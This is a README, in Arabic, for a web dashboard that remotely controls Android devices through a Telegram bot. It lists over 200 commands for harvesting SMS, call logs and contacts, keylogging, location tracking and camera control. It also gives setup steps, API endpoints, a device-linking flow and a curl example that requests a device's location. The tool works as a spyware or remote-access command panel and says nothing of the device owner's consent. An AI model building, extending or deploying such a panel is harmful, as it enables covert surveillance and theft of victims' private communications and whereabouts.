# Abu-Zahra Web Dashboard

تطبيق ويب متكامل للتحكم عن بعد في الأجهزة، متزامن مع Telegram.

## المميزات

- 📊 **لوحة تحكم شاملة**: عرض إحصائيات الأجهزة والأوامر
- 📱 **إدارة الأجهزة**: ربط وإدارة أجهزة متعددة
- 🎮 **200+ أمر**: أوامر التحكم وجمع البيانات
- 🔍 **المراقبة**: تتبع الموقع وتسجيل المفاتيح
- ⚡ **تحديثات فورية**: عبر WebSocket
- 🤖 **تكامل Telegram**: إشعارات وتحكم عبر البوت

## التشغيل

### 1. إعداد متغيرات البيئة

أنشئ ملف `.env` بالمحتوى التالي:

```env
# Telegram Bot
TELEGRAM_BOT_TOKEN=your_bot_token
TELEGRAM_ADMIN_CHAT_ID=your_chat_id

# Database (SQLite by default)
DATABASE_URL=file:./db/custom.db
```

### 2. تشغيل التطبيق

```bash
# تثبيت التبعيات
bun install

# إنشاء قاعدة البيانات
bun run db:push

# تشغيل التطبيق
bun run dev
```

## API Endpoints

### الأجهزة
- `GET /api/devices` - قائمة الأجهزة
- `POST /api/devices` - تسجيل جهاز جديد
- `GET /api/devices/[id]` - تفاصيل جهاز
- `DELETE /api/devices/[id]` - حذف جهاز

### الأوامر
- `GET /api/commands` - قائمة الأوامر
- `POST /api/commands` - إرسال أمر
- `GET /api/commands/[id]` - حالة أمر
- `POST /api/commands/[id]/result` - نتيجة أمر

### أكواد الربط
- `GET /api/link-code` - قائمة الأكواد
- `POST /api/link-code` - إنشاء كود جديد

### الإحصائيات
- `GET /api/stats` - إحصائيات السيرفر

## التواصل مع التطبيق الأصلي

### ربط جهاز جديد

1. أرسل `POST /api/link-code` لإنشاء كود ربط
2. أدخل الكود في تطبيق الأندرويد
3. سيتم تسجيل الجهاز تلقائياً

### إرسال أوامر

```bash
curl -X POST http://localhost:3000/api/commands \
  -H "Content-Type: application/json" \
  -d '{"deviceId": "device_id", "command": "get_location"}'
```

### استقبال النتائج

يرسل التطبيق النتائج إلى:
```
POST /api/commands/[id]/result
```

## التصنيفات

| التصنيف | الوصف |
|---------|-------|
| data | جمع البيانات (SMS, المكالمات, جهات الاتصال) |
| control | التحكم عن بعد (الكاميرا, القفل, الرنين) |
| monitor | المراقبة (تسجيل المفاتيح, تتبع الموقع) |
| system | إعدادات النظام (WiFi, بلوتوث, NFC) |

## الأمان

- تحقق من صلاحيات المرسل قبل تنفيذ الأوامر
- استخدم HTTPS في الإنتاج
- احمِ API keys وtokens

## الترخيص

MIT License
